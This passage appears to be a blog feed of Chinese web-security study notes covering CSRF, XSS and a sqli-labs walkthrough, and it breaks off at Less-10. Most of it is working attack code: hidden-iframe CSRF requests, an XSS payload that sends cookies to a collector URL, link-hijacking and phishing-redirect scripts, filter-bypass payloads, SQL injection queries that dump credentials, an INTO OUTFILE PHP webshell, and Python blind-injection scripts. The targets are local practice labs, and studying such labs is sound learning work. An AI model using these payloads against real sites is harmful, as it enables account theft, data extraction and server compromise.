class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>一种比较特别的攻击，利用 css中 backgroud 样式 中的url 加载远程机器上的内容，从而对url 中的内容发送http请求</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span></span><br><span class="line">&#123;</span><br><span class="line">    backgroud: <span class="number">#00FF00</span> <span class="built_in">url</span>(<span class="string">http://127.0.0.1/get_csrf/new_user.php?username=liuxiaoyang&amp;password=123456</span>) no-repeat fixed top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞总结</title>
      <link href="2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
      <url>2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>笔者深入学习了XSS漏洞的成因 利用 绕过</p><span id="more"></span><h2 id="跨站脚本攻击XSS"><a href="#跨站脚本攻击XSS" class="headerlink" title="跨站脚本攻击XSS"></a>跨站脚本攻击XSS</h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>恶意攻击者往web页面中插入恶意javascript代码，当用户浏览此页时，嵌入其中web页面中的javascript代码会被执行，从而达到恶意攻击用户的目的</p><p><img src="/2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/image-20210128120154200.png" class="lazyload" data-srcset="/2021/01/28/xss%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/image-20210128120154200.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210128120154200"></p><h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>反射型xss又称为非持久型xss，攻击具有一次性</p><p>攻击者通过邮件形式将包含xss代码的构造连接发送个正常用户，当用户点击时，服务器接受该用户的请求并且处理，将带有xss payload的web页面发给用户。用户浏览器解析，触发该漏洞</p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>存储型xss又称为持久型xss，攻击脚本储存在服务器的数据库中</p><p>攻击者在论坛、博客、留言板中</p><p>发贴的过程嵌入xss代码，帖子被服务器存储在数据库中。用户正常访问时，会触发xss代码</p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>DOM全称Document Object Model，使用DOM动态访问更新文档的内容、结构以及样式。通过htmlDOM可以对DOM树上所有节点进行修改。服务器响应不会处理攻击者脚本，当用户浏览器处理这个响应时，dom对象处理xss代码，触发xss漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用xss漏洞盗取cookie"><a href="#利用xss漏洞盗取cookie" class="headerlink" title="利用xss漏洞盗取cookie"></a>利用xss漏洞盗取cookie</h4><blockquote><p>cookie：Cookie是在http协议下，服务器或者脚本维护客户工作站上信息的一种方式。服务器端利用cookies包含信息的任意性来筛选维护这些信息，用来判断在http传输中的状态。cookie最常用于会话令牌。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&#x27;http://127.0.0.1/xss/cookie.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="利用xss篡改网页链接，实现引流"><a href="#利用xss篡改网页链接，实现引流" class="headerlink" title="利用xss篡改网页链接，实现引流"></a>利用xss篡改网页链接，实现引流</h5><blockquote><p>window.onload 窗口加载事件</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line">        for(j=0;j&lt;link.length;j++)&#123;</span><br><span class="line"><span class="javascript">            link[j].href=<span class="string">&quot;https://baidu.com/&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">#这里利用了一个匿名函数，当窗口加载时，使用for循环获取所有的a标签，更改a标签的href属性为攻击者想要跳转的站点</span><br></pre></td></tr></table></figure><p>利用kali里面的beef恶意链接生成，利用hook.js 执行其他命令</p><h4 id="利用xss盗取用户信息-盗号"><a href="#利用xss盗取用户信息-盗号" class="headerlink" title="利用xss盗取用户信息(盗号)"></a>利用xss盗取用户信息(盗号)</h4><p>克隆站点登陆页面，利用存储型xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入账密登入，账号和密码都被储存下来</p><p>setookit工具克隆网站非常简单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.loaction=<span class="string">&quot;http://192.168.53.28/&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSS-bypass技巧-根据http-xss-quiz-int21h-jp-总结"><a href="#XSS-bypass技巧-根据http-xss-quiz-int21h-jp-总结" class="headerlink" title="XSS bypass技巧(根据http://xss-quiz.int21h.jp 总结)"></a>XSS bypass技巧(根据<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp</a> 总结)</h3><ol><li><p>```html<br>“<script>alert(document.domain);</script><b>“</b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;html</span><br><span class="line">   1&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;&lt;&quot;</span><br><span class="line">   &quot; onclick&#x3D;alert(document.domain)&gt;</span><br><span class="line">   &quot; onmouseover&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择列表中的xss  抓包分析</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1&amp;p2=Japan&lt;/option&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>隐藏表单的xss </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1&amp;p2=Japan&amp;p3=1&quot;&gt;&lt;script&gt;alert(xss)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>baypass maxlength长度限制 直接删掉maxlength属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>bypass 尖括号转义  通过事件处理器来绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(document.domain);&quot;</span><br></pre></td></tr></table></figure></li><li><p>bypass 空格分隔的xss 绕过属性值强制加引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 onclick=alert(document.domain);</span><br></pre></td></tr></table></figure></li><li><p>利用javascript为协议进行绕过</p><blockquote><p>javascript 伪协议简介</p><p>将javascript代码添加得到客户端的方法是把它放置在伪协议说明符javascript:后的url中</p><p>这个伪协议声明了url的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript打码</p><p>含有多个语句，必须使用分号分开。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure></li><li><p>utf-7 绕过 （较为小众）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ACIAIABvAG4AYwBsAGkAYwBrACAAPQAgACIAIABhAGwAZQByAHQAKABkAG8AYwB1AG0AZQBuAHQALgBkAG8AbQBhAGkAbgApAA0AC-</span><br></pre></td></tr></table></figure></li><li><p>编码绕过 双写绕过 过滤关键字</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(atob(<span class="string">&quot;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-libs通关笔记</title>
      <link href="2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>从去年入门时就玩过一段时间的sqli-labs，打通过10多关就没有坚持下来，后面的ctf做题中，其实发现自己对sql注入的掌握并不是尽如人意，重回靶场。未完待续！</p><span id="more"></span><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;-- +</span></span><br><span class="line"><span class="string">http://sqli/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(CONCAT(username,<span class="number">0x7e</span>,password)),<span class="number">3</span> <span class="keyword">FROM</span> users <span class="comment">-- +</span></span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>  <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;<span class="comment">-- a</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(username,<span class="string">&#x27;~&#x27;</span>,password)),<span class="number">3</span>  <span class="keyword">from</span> users<span class="comment">-- a</span></span><br></pre></td></tr></table></figure><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;-- a&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(concat(username,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,password)) from users-- a</span></span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-4</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;-- a</span><br><span class="line">http://sqli/Less-4/?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(username,<span class="string">&#x27;~&#x27;</span>,password)),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment">-- a</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) and 1=&#x27;</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">#为了把数据截断的更全一些</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;|| updatexml(1,concat(0x7e,substr((select group_concat(column_name) From  information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,32),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;|| updatexml(1,concat(0x7e,substr((select group_concat(concat(username,0x7e,password)) From  users),1,32),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;|| updatexml(1,concat(0x7e,substr((select group_concat(column_name) From  information_schema.columns where table_name=&#x27;users&#x27;),1,32),0x7e),1) or &#x27;1&#x27;=&quot;<span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-6</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; || updatexml(1,concat(0x7e,substr((select group_concat(concat(username,0x7e,password)) From  users),1,32),0x7e),1) or &#x27;1&#x27;=&quot;<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><h4 id="outfile写入webshell"><a href="#outfile写入webshell" class="headerlink" title="outfile写入webshell"></a>outfile写入webshell</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php  @eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli\\less-7\\webshell1.php&quot; -- a  </span></span><br></pre></td></tr></table></figure><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><h4 id="最简单的bool盲注"><a href="#最简单的bool盲注" class="headerlink" title="最简单的bool盲注"></a>最简单的bool盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">booler_injection</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_head=<span class="string">&#x27;the_data_is:...&#x27;</span></span><br><span class="line">    py_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>:<span class="string">&#x27;?id=1\&#x27; and ord(substr((select database()),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>:<span class="string">&#x27;?id=1\&#x27; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>:<span class="string">&#x27;?id=1\&#x27; and ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">            payload_str=py_dict[<span class="string">&#x27;str3&#x27;</span>].<span class="built_in">format</span>(i,j)</span><br><span class="line">            pld=url+payload_str</span><br><span class="line">            req1=req.get(pld)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                str_head=str_head+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(str_head)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/Less-8/&quot;</span></span><br><span class="line">    booler_injection(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><h4 id="最简单的time盲注"><a href="#最简单的time盲注" class="headerlink" title="最简单的time盲注"></a>最简单的time盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_injection</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_head=<span class="string">&quot;the_data_is:...&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    py_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            payload_str=url+py_dict[<span class="string">&#x27;str1&#x27;</span>].<span class="built_in">format</span>(i,j)</span><br><span class="line">            req1=req.get(url=payload_str,headers=headers)</span><br><span class="line">            next_time=time.time()</span><br><span class="line">            <span class="keyword">if</span>(next_time-start_time&gt;<span class="number">3</span>):</span><br><span class="line">                str_head=str_head+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(str_head)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/Less-9/&quot;</span></span><br><span class="line">    <span class="comment">#booler_injection(url)</span></span><br><span class="line">    time_injection(url)</span><br></pre></td></tr></table></figure><p>我发现这个程序速度太慢了，于是加了一个二分搜索的优化，然而本人发现并没有提速反而变慢了，就很难受！</p><p>而且本人对算法没有研究过，代码真是难看，后面会学一下搜索的算法，然后再次优化</p><h4 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_injection_add</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_head = <span class="string">&quot;the_data_is:...&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    py_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_max=<span class="number">127</span>;the_min=<span class="number">32</span></span><br><span class="line">        <span class="keyword">while</span> the_min&lt;the_max:</span><br><span class="line">            mid=(the_max+the_min)&gt;&gt;<span class="number">1</span></span><br><span class="line">            payload_str=url+py_dict[<span class="string">&#x27;str1&#x27;</span>].<span class="built_in">format</span>(i,mid)</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            req1=req.get(payload_str,headers)</span><br><span class="line">            next_time=time.time()</span><br><span class="line">            <span class="keyword">if</span> next_time-start_time&gt;<span class="number">3</span>:</span><br><span class="line">                the_min=mid</span><br><span class="line">                <span class="keyword">if</span> the_max-the_min==<span class="number">1</span>: <span class="comment">#因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span></span><br><span class="line">                    mid=the_min+<span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max=mid</span><br><span class="line">        str_head=str_head+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(str_head)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/Less-9/&quot;</span></span><br><span class="line">    <span class="comment">#booler_injection(url)</span></span><br><span class="line">    <span class="comment">#time_injection(url)</span></span><br><span class="line">    time_injection_add(url)</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 